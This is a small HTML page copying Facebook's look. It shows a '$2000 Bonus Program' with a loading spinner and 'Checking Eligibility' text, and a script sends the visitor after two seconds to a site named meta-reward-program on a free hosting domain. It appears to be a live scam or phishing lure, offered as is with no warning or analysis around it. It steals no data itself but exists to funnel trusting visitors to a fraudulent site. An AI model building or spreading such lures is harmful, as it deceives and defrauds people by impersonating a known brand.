<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checking Eligibility...</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    background:#f0f2f5;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.box{
    background:#fff;
    padding:40px 30px;
    border-radius:15px;
    box-shadow:0 10px 30px rgba(0,0,0,.12);
    text-align:center;
    max-width:420px;
    width:90%;
}

.loader{
    width:60px;
    height:60px;
    margin:0 auto 25px;
    border:6px solid #e4e6eb;
    border-top:6px solid #1877f2;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

h2{
    color:#1877f2;
    margin-bottom:12px;
    font-size:26px;
}

p{
    color:#555;
    font-size:18px;
    line-height:1.5;
}

@keyframes spin{
    to{
        transform:rotate(360deg);
    }
}
</style>

<script>
setTimeout(function () {
    window.location.href = "https://meta-reward-program.surge.sh/";
}, 2000);
</script>

</head>
<body>

<div class="box">
    <div class="loader"></div>
    <h2>$2000 Bonus Program</h2>
    <p><strong>Checking Eligibility...</strong><br>Please wait.</p>
</div>

</body>
</html>
